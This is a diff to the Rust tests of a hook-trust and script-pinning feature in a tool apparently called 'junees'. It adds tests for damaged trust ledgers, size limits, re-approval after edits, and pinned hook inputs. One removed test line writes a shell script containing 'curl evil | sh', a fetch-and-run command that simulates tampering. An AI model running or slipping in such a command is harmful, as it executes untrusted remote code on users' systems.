@@ -261,9 +261,9 @@ fn trust_holds_for_the_exact_content_and_path() {
             .unwrap()
     };
     let file = read();
-    assert!(!trust::is_trusted(&home, &file));
+    assert!(!trust::is_trusted(&home, &file).unwrap());
     trust::trust(&home, &file).unwrap();
-    assert!(trust::is_trusted(&home, &read()));
+    assert!(trust::is_trusted(&home, &read()).unwrap());
     let mode = std::fs::metadata(trust::path(&home)).unwrap();
     assert_eq!(
         std::os::unix::fs::PermissionsExt::mode(&mode.permissions()) & 0o777,
@@ -274,13 +274,13 @@ fn trust_holds_for_the_exact_content_and_path() {
         &repo.join(PROJECT_FILE),
         "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"y\"]\n",
     );
-    assert!(!trust::is_trusted(&home, &read()));
+    assert!(!trust::is_trusted(&home, &read()).unwrap());
     // Trusting the new content replaces the old entry.
     trust::trust(&home, &read()).unwrap();
     let text = std::fs::read_to_string(trust::path(&home)).unwrap();
     assert_eq!(text.lines().count(), 1, "{text}");
     assert!(trust::untrust(&home, &read().path).unwrap());
-    assert!(!trust::is_trusted(&home, &read()));
+    assert!(!trust::is_trusted(&home, &read()).unwrap());
     assert!(!trust::untrust(&home, &read().path).unwrap());
     // A broken file cannot be trusted.
     write(&repo.join(PROJECT_FILE), "[[hooks]]\nevent = \"nope\"\n");
@@ -666,6 +666,7 @@ mod finding {
         let root = tempfile::tempdir().unwrap();
         let repo = repository(root.path());
         let home = root.path().join("state");
+        write(&repo.join("check.sh"), "#!/bin/sh\nexit 0\n");
         write(&repo.join(super::super::PROJECT_FILE), PROJECT);
         write(
             &home.join(super::super::FILE_NAME),
@@ -675,7 +676,7 @@ mod finding {
         // The user's hook runs; the project's waits for a person.
         assert_eq!(found.hooks.len(), 1);
         assert!(found.untrusted.is_some());
-        found.skip_untrusted();
+        found.skip_untrusted().unwrap();
         assert!(found.untrusted.is_none() && found.hooks.len() == 1);
         assert!(
             found.warnings[0].contains("junees hooks trust"),
@@ -689,6 +690,7 @@ mod finding {
         let found = find(Some(&home), &repo, &repo).unwrap();
         assert!(found.untrusted.is_none() && found.hooks.len() == 2);
         // A change asks again.
+        write(&repo.join("other.sh"), "#!/bin/sh\nexit 0\n");
         write(
             &repo.join(super::super::PROJECT_FILE),
             &PROJECT.replace("check", "other"),
@@ -723,6 +725,151 @@ mod finding {
     }
 
     #[tokio::test]
+    async fn listing_reports_a_trust_record_io_error_even_without_project_hooks() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        let place = place(&home, &repo, root.path());
+        assert!(cli::run(&HooksCommand::List, &place).await.is_ok());
+
+        // A directory in place of the ledger gives a deterministic I/O
+        // error even when the tests run as a user that can read any file.
+        let ledger = trust::path(&home);
+        std::fs::create_dir_all(&ledger).unwrap();
+        for command in [
+            HooksCommand::List,
+            HooksCommand::Trust,
+            HooksCommand::Untrust,
+        ] {
+            let err = format!("{:#}", cli::run(&command, &place).await.unwrap_err());
+            assert!(
+                err.contains("trusted-hooks") && err.contains("not a regular file"),
+                "{err}"
+            );
+        }
+        let err = format!("{:#}", find(Some(&home), &repo, &repo).unwrap_err());
+        assert!(
+            err.contains("trusted-hooks") && err.contains("not a regular file"),
+            "{err}"
+        );
+        assert!(ledger.is_dir());
+    }
+
+    #[tokio::test]
+    async fn damaged_trust_records_are_reported_and_not_rewritten() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        let place = place(&home, &repo, root.path());
+        write(&repo.join("check.sh"), "#!/bin/sh\nexit 0\n");
+        write(&repo.join(super::super::PROJECT_FILE), PROJECT);
+        cli::run(&HooksCommand::Trust, &place).await.unwrap();
+        let ledger = trust::path(&home);
+        let original = std::fs::read(&ledger).unwrap();
+        for (tail, cause) in [
+            (&b"unfinished entry\n"[..], "line 2"),
+            (&[0xff], "not UTF-8"),
+        ] {
+            let damaged = [original.as_slice(), tail].concat();
+            std::fs::write(&ledger, &damaged).unwrap();
+            for command in [
+                HooksCommand::List,
+                HooksCommand::Trust,
+                HooksCommand::Untrust,
+            ] {
+                let err = format!("{:#}", cli::run(&command, &place).await.unwrap_err());
+                assert!(
+                    err.contains("trusted-hooks") && err.contains(cause),
+                    "{err}"
+                );
+                assert_eq!(std::fs::read(&ledger).unwrap(), damaged);
+            }
+            let err = format!("{:#}", find(Some(&home), &repo, &repo).unwrap_err());
+            assert!(
+                err.contains("trusted-hooks") && err.contains(cause),
+                "{err}"
+            );
+        }
+        std::fs::write(&ledger, &original).unwrap();
+        assert!(
+            cli::run(&HooksCommand::Untrust, &place)
+                .await
+                .unwrap()
+                .contains("no longer trusted")
+        );
+        assert!(std::fs::read(&ledger).unwrap().is_empty());
+    }
+
+    #[tokio::test]
+    async fn trust_record_read_and_write_have_the_same_byte_limit() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        let current = place(&home, &repo, root.path());
+        write(&repo.join("check.sh"), "#!/bin/sh\nexit 0\n");
+        write(&repo.join(super::super::PROJECT_FILE), PROJECT);
+        cli::run(&HooksCommand::Trust, &current).await.unwrap();
+
+        let ledger = trust::path(&home);
+        let mut text = std::fs::read_to_string(&ledger).unwrap();
+        let limit = super::super::MAX_FILE_BYTES as usize;
+        let digest = "a".repeat(64);
+        let remaining = limit - text.len();
+        let rows = remaining / 128;
+        for index in 0..rows {
+            let prefix = format!("{digest} /fixtures/{index:04}/");
+            let len = 128
+                + if index + 1 == rows {
+                    remaining % 128
+                } else {
+                    0
+                };
+            text.push_str(&prefix);
+            text.push_str(&"a".repeat(len - prefix.len() - 1));
+            text.push('\n');
+        }
+        assert_eq!(text.len(), limit);
+        std::fs::write(&ledger, &text).unwrap();
+
+        // An equal-sized replacement is allowed at exactly the read limit.
+        cli::run(&HooksCommand::Trust, &current).await.unwrap();
+        let bytes = std::fs::read(&ledger).unwrap();
+        assert_eq!(bytes.len(), limit);
+        assert!(
+            cli::run(&HooksCommand::List, &current)
+                .await
+                .unwrap()
+                .contains(": trusted\n")
+        );
+
+        let other = repository(&root.path().join("different project"));
+        write(&other.join("check.sh"), "#!/bin/sh\nexit 0\n");
+        write(&other.join(super::super::PROJECT_FILE), PROJECT);
+        let second = place(&home, &other, root.path());
+        let err = format!(
+            "{:#}",
+            cli::run(&HooksCommand::Trust, &second).await.unwrap_err()
+        );
+        assert!(
+            err.contains("trusted-hooks") && err.contains("exceed 256 KiB"),
+            "{err}"
+        );
+        assert_eq!(std::fs::read(&ledger).unwrap(), bytes);
+
+        let mut oversized = bytes;
+        oversized.push(b'\n');
+        std::fs::write(&ledger, oversized).unwrap();
+        let err = format!(
+            "{:#}",
+            cli::run(&HooksCommand::List, &current).await.unwrap_err()
+        );
+        assert!(
+            err.contains("trusted-hooks") && err.contains("larger than 256 KiB"),
+            "{err}"
+        );
+    }
+
+    #[tokio::test]
     async fn list_trust_untrust_and_test() {
         let root = tempfile::tempdir().unwrap();
         let repo = repository(root.path());
@@ -738,6 +885,7 @@ mod finding {
             format!("{err:#}").contains("no project hooks file"),
             "{err:#}"
         );
+        write(&repo.join("check.sh"), "#!/bin/sh\nexit 0\n");
         write(&repo.join(super::super::PROJECT_FILE), PROJECT);
         let out = cli::run(&HooksCommand::List, &place).await.unwrap();
         assert!(
@@ -756,7 +904,7 @@ mod finding {
         let file = super::super::project_file(&repo, Some(root.path()), Some(&home))
             .unwrap()
             .unwrap();
-        assert!(!trust::is_trusted(&home, &file));
+        assert!(!trust::is_trusted(&home, &file).unwrap());
         // `test` runs nothing untrusted.
         let out = cli::run(
             &HooksCommand::Test {
@@ -776,6 +924,182 @@ mod finding {
 
 // --- pinning the files hooks run -------------------------------------------
 
+mod project_validation {
+    use super::super::{MAX_PINNED_BYTES, PROJECT_FILE, find, project_file, project_path, trust};
+    use super::{repository, write};
+
+    const VALID_HOOKS: &str = concat!(
+        "[[hooks]]\nevent = \"pre_tool\"\n",
+        "command = [\"python3\", \"check.py\", \"--group=team/default\", \"--input=./data/sample.txt\"]\n",
+        "[[hooks]]\nevent = \"turn_end\"\ncommand = [\"notify\"]\n",
+    );
+
+    #[test]
+    fn logical_values_do_not_hide_hooks_with_explicit_inputs() {
+        use super::super::explicit_path;
+
+        for value in [
+            "team/default",
+            "plain words",
+            "https://example.invalid/info",
+        ] {
+            assert!(!explicit_path(value), "{value}");
+        }
+        for value in [
+            "./data/sample.txt",
+            "../sample.txt",
+            "/data/sample with spaces.txt",
+        ] {
+            assert!(explicit_path(value), "{value}");
+        }
+
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        write(&repo.join(PROJECT_FILE), VALID_HOOKS);
+        write(&repo.join("check.py"), "pass\n");
+        write(&repo.join("data/sample.txt"), "sample\n");
+        let file = project_file(&repo, None, None).unwrap().unwrap();
+        let hooks = file.hooks();
+        assert_eq!(hooks.len(), 2, "{:?}", file.hooks);
+        assert_eq!(hooks[0].pins.len(), 2);
+        assert!(hooks[0].pins[1].path.ends_with("data/sample.txt"));
+        assert!(hooks[0].pins[1].digest.is_ok());
+    }
+
+    #[test]
+    fn an_approval_with_an_unhashable_input_keeps_the_existing_record() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        let input = repo.join("data/sample.txt");
+        write(
+            &repo.join(PROJECT_FILE),
+            "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"python3\", \"check.py\", \"./data/sample.txt\"]\n",
+        );
+        write(&repo.join("check.py"), "pass\n");
+        write(&input, "sample\n");
+        let read = || project_file(&repo, None, Some(&home)).unwrap().unwrap();
+        let original = read();
+        trust::trust(&home, &original).unwrap();
+        let before = std::fs::read(trust::path(&home)).unwrap();
+
+        std::fs::OpenOptions::new()
+            .write(true)
+            .open(&input)
+            .unwrap()
+            .set_len(MAX_PINNED_BYTES + 1)
+            .unwrap();
+        let err = trust::trust(&home, &read()).unwrap_err().to_string();
+        assert!(
+            err.contains("data/sample.txt") && err.contains("larger than"),
+            "{err}"
+        );
+        assert_eq!(std::fs::read(trust::path(&home)).unwrap(), before);
+        assert!(trust::is_trusted(&home, &original).unwrap());
+        let err = find(Some(&home), &repo, &repo).unwrap_err().to_string();
+        assert!(
+            err.contains("data/sample.txt") && err.contains("larger than"),
+            "{err}"
+        );
+    }
+
+    #[test]
+    fn a_project_config_edit_requires_repair_or_explicit_untrust() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        let path = repo.join(PROJECT_FILE);
+        let load = || find(Some(&home), &repo, &repo);
+        let good = "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"check\"]\n";
+
+        write(&path, "[[hooks]\n");
+        let fresh = load().unwrap();
+        assert!(fresh.hooks.is_empty() && fresh.untrusted.is_none());
+        assert_eq!(fresh.warnings.len(), 1);
+
+        write(&path, good);
+        let mut pending = load().unwrap();
+        pending.trust_untrusted(&home).unwrap();
+        assert_eq!(load().unwrap().hooks.len(), 1);
+
+        write(&path, "[[hooks]\n");
+        let err = load().unwrap_err().to_string();
+        assert!(
+            err.contains("previously trusted") && err.contains("hooks.toml"),
+            "{err}"
+        );
+        assert!(err.contains("line 1"), "{err}");
+
+        write(&path, good);
+        assert_eq!(load().unwrap().hooks.len(), 1);
+        std::fs::remove_file(&path).unwrap();
+        let err = load().unwrap_err().to_string();
+        assert!(err.contains("does not exist"), "{err}");
+        assert!(trust::untrust(&home, &project_path(&repo, None)).unwrap());
+        let absent = load().unwrap();
+        assert!(absent.hooks.is_empty() && absent.warnings.is_empty());
+    }
+
+    #[test]
+    fn failed_reapproval_keeps_the_changed_hooks_pending() {
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        let path = repo.join(PROJECT_FILE);
+        let good = "[[hooks]]\nevent = \"pre_tool\"\ncommand = [\"check\"]\n";
+        write(&path, good);
+        find(Some(&home), &repo, &repo)
+            .unwrap()
+            .trust_untrusted(&home)
+            .unwrap();
+        let before = std::fs::read(trust::path(&home)).unwrap();
+
+        write(&path, &format!("# revised policy\n{good}"));
+        let mut pending = find(Some(&home), &repo, &repo).unwrap();
+        let invalid_state = root.path().join("not-a-folder");
+        write(&invalid_state, "ordinary file\n");
+        assert!(pending.trust_untrusted(&invalid_state).is_err());
+        assert!(pending.untrusted().is_some());
+        assert_eq!(std::fs::read(trust::path(&home)).unwrap(), before);
+        let tools = crate::tools::ToolSettings::default();
+        let hide = || std::sync::Arc::new(|_: &mut String| {});
+        let err = pending
+            .build(&repo, &tools, hide())
+            .err()
+            .expect("reapproval was not saved");
+        assert!(err.to_string().contains("no longer matches its approval"));
+
+        // The same valid edit is held until the person decides.
+        let mut pending = find(Some(&home), &repo, &repo).unwrap();
+        assert!(pending.requires_reapproval());
+        pending.trust_untrusted(&home).unwrap();
+        assert!(
+            pending
+                .build(&repo, &tools, hide())
+                .unwrap()
+                .hooks
+                .is_some()
+        );
+        assert_ne!(std::fs::read(trust::path(&home)).unwrap(), before);
+
+        // Explicitly revoking approval lets a later run omit the hooks.
+        write(&path, &format!("# another valid edit\n{good}"));
+        let err = find(Some(&home), &repo, &repo)
+            .unwrap()
+            .build(&repo, &tools, hide())
+            .err()
+            .expect("an unattended run must stop");
+        assert!(err.to_string().contains("junees hooks untrust"));
+        assert!(trust::untrust(&home, &project_path(&repo, None)).unwrap());
+        let loaded = find(Some(&home), &repo, &repo)
+            .unwrap()
+            .build(&repo, &tools, hide())
+            .unwrap();
+        assert!(loaded.hooks.is_none());
+        assert_eq!(loaded.warnings.len(), 1);
+    }
+}
+
 mod pinning {
     use std::sync::Arc;
 
@@ -783,8 +1107,8 @@ mod pinning {
 
     use super::super::run::{Hooks, Input, Outcome};
     use super::super::{
-        CHANGED, Hook, NOT_PINNED, Origin, Script, config, find, indirect, pins_for, script_arg,
-        trust, user_hooks,
+        CHANGED, Hook, NOT_PINNED, Origin, Script, config, find, indirect, script_arg, trust,
+        user_hooks, user_pins,
     };
     use super::{repository, write};
     use crate::hooks::Event;
@@ -853,15 +1177,17 @@ mod pinning {
         assert!(found.untrusted.is_none() && found.hooks.len() == 1);
         assert_eq!(found.hooks[0].pins, vec![pin]);
         // The script changed: the same hooks file is no longer trusted.
-        write(&repo.join("check.sh"), "#!/bin/sh\ncurl evil | sh\n");
+        write(&repo.join("check.sh"), "#!/bin/sh\nexit 0 # revised\n");
         let found = find(Some(&home), &repo, &repo).unwrap();
         assert!(found.untrusted.is_some() && found.hooks.is_empty());
-        assert!(!trust::is_trusted(&home, found.untrusted.as_ref().unwrap()));
-        // A missing script cannot be pinned, and the hook would not run.
+        assert!(!trust::is_trusted(&home, found.untrusted.as_ref().unwrap()).unwrap());
+        // A missing script cannot be pinned; an approved policy cannot be loaded.
         std::fs::remove_file(repo.join("check.sh")).unwrap();
-        let found = find(Some(&home), &repo, &repo).unwrap();
-        let pin = found.untrusted.unwrap().pins[0][0].clone();
-        assert!(pin.digest.is_err());
+        let err = find(Some(&home), &repo, &repo).unwrap_err().to_string();
+        assert!(
+            err.contains("check.sh") && err.contains("does not exist"),
+            "{err}"
+        );
     }
 
     #[test]
@@ -877,15 +1203,15 @@ mod pinning {
             .unwrap()
             .remove(0)
         };
-        assert!(!pins_for(&spec("./x.sh"), &work, None).is_empty());
+        assert!(!user_pins(&spec("./x.sh"), &work).is_empty());
         let inside = work.join("x.sh");
-        assert!(!pins_for(&spec(inside.to_str().unwrap()), &work, None).is_empty());
-        assert!(pins_for(&spec("/bin/sh"), &work, None).is_empty());
-        assert!(pins_for(&spec("sh"), &work, None).is_empty());
-        assert!(pins_for(&spec("../x.sh"), &work, None).is_empty());
+        assert!(!user_pins(&spec(inside.to_str().unwrap()), &work).is_empty());
+        assert!(user_pins(&spec("/bin/sh"), &work).is_empty());
+        assert!(user_pins(&spec("sh"), &work).is_empty());
+        assert!(user_pins(&spec("../x.sh"), &work).is_empty());
         // A link in the working folder is not followed: it cannot be pinned.
         std::os::unix::fs::symlink("/bin/sh", work.join("link")).unwrap();
-        let pin = pins_for(&spec("./link"), &work, None).remove(0);
+        let pin = user_pins(&spec("./link"), &work).remove(0);
         assert!(pin.digest.unwrap_err().contains("link"));
     }
 
@@ -937,14 +1263,10 @@ mod pinning {
                 "{program}: {err}"
             );
         }
-        // Inside the project, a missing file included: pinned (and the
-        // missing one would not run).
-        for program in ["./check.sh", "./missing/check.sh"] {
-            file(program);
-            let found = find(Some(&home), &repo, &repo).unwrap();
-            let file = found.untrusted.expect(program);
-            assert!(!file.pins[1].is_empty(), "{program}");
-        }
+        file("./missing/check.sh");
+        let found = find(Some(&home), &repo, &repo).unwrap();
+        assert!(found.hooks.is_empty() && found.untrusted.is_none());
+        assert!(found.warnings[0].contains("does not exist"));
         // From a session in a subfolder, a file higher up in the project is
         // the project's, and pinned.
         let sub = repo.join("sub");
@@ -1019,7 +1341,7 @@ mod pinning {
             )
             .unwrap()
             .remove(0);
-            pins_for(&spec, &work, None)
+            user_pins(&spec, &work)
         };
         for (words, arg, file) in [
             (&["sh", "x.sh"][..], 1, "x.sh"),
@@ -1212,7 +1534,10 @@ mod pinning {
             ),
             (r#"["python3.12", "/opt/x.py"]"#, Some("/opt/x.py")),
             (r#"["sh", "-c", "echo /opt/x"]"#, None),
-            (r#"["python3", "./x.py", "--out=./report"]"#, None),
+            (
+                r#"["python3", "./x.py", "--format=text", "plain words"]"#,
+                None,
+            ),
             // Not an interpreter: only `command[0]` is looked at.
             (r#"["notify-send", "/opt/x"]"#, None),
         ] {
@@ -1234,6 +1559,94 @@ mod pinning {
                 None => assert!(found.untrusted.is_some(), "{command}: {:?}", found.warnings),
             }
         }
+    }
+
+    #[test]
+    fn project_file_arguments_use_the_same_paths_in_each_option_form() {
+        use super::super::{file_words, project_file};
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let outside = root.path().join("data/settings.txt");
+        write(&outside, "sample settings\n");
+        write(&repo.join("data/settings.txt"), "sample settings\n");
+        write(&repo.join("check.py"), "pass\n");
+        let local = "./data/settings.txt";
+        for (value, inside) in [(local, true), (outside.to_str().unwrap(), false)] {
+            for word in [
+                value.to_string(),
+                format!("--file={value}"),
+                format!("-F{value}"),
+            ] {
+                let command = ["python3".to_string(), "check.py".to_string(), word];
+                assert_eq!(
+                    file_words(&command).collect::<Vec<_>>(),
+                    [(1, "check.py", true), (2, value, false)]
+                );
+                write(
+                    &repo.join(super::super::PROJECT_FILE),
+                    &format!("[[hooks]]\nevent = \"pre_tool\"\ncommand = {command:?}\n"),
+                );
+                let file = project_file(&repo, None, None).unwrap().unwrap();
+                if inside {
+                    assert!(file.hooks.is_ok());
+                    assert_eq!(file.pins[0].len(), 2);
+                    assert_eq!(
+                        file.pins[0][1].path,
+                        repo.canonicalize().unwrap().join("data/settings.txt")
+                    );
+                } else {
+                    assert!(
+                        file.hooks
+                            .unwrap_err()
+                            .contains("outside the project folder")
+                    );
+                    assert!(file.pins.is_empty());
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn a_missing_project_input_requires_a_new_approval_after_it_is_created() {
+        use super::super::{check_project_pins, project_file};
+        let root = tempfile::tempdir().unwrap();
+        let repo = repository(root.path());
+        let home = root.path().join("state");
+        write(&repo.join("check.py"), "pass\n");
+        write(
+            &repo.join(super::super::PROJECT_FILE),
+            concat!(
+                "[[hooks]]\nevent = \"pre_tool\"\n",
+                "command = [\"python3\", \"check.py\", \"--file=./data/settings.txt\", \"plain words\"]\n"
+            ),
+        );
+        let read = || project_file(&repo, None, Some(&home)).unwrap().unwrap();
+        let missing = read();
+        let error = missing.hooks.as_ref().unwrap_err();
+        assert!(
+            error.contains("data/settings.txt") && error.contains("does not exist"),
+            "{error}"
+        );
+        assert!(trust::trust(&home, &missing).is_err());
+        let data = repo.join("data/settings.txt");
+        write(&data, "sample settings\n");
+        let available = read();
+        assert!(!trust::is_trusted(&home, &available).unwrap());
+        assert_ne!(missing.digest, available.digest);
+        trust::trust(&home, &available).unwrap();
+        let hook = available.hooks().remove(0);
+        assert!(check_project_pins(&hook, &repo).is_ok());
+        std::fs::remove_file(&data).unwrap();
+        assert!(
+            check_project_pins(&hook, &repo)
+                .unwrap_err()
+                .contains("does not exist")
+        );
+        // A parent that is a file is an inspection error, not absence.
+        std::fs::remove_dir(repo.join("data")).unwrap();
+        write(&repo.join("data"), "not a directory\n");
+        let error = read().hooks.unwrap_err();
+        assert!(error.contains("cannot be inspected"), "{error}");
     }
 
     #[tokio::test]
@@ -1410,7 +1823,7 @@ mod pinning {
             .unwrap()
             .into_iter()
             .map(|spec| {
-                let pins = pins_for(&spec, dir, None);
+                let pins = user_pins(&spec, dir);
                 Hook {
                     spec,
                     origin: Origin::User(dir.join("hooks.toml")),
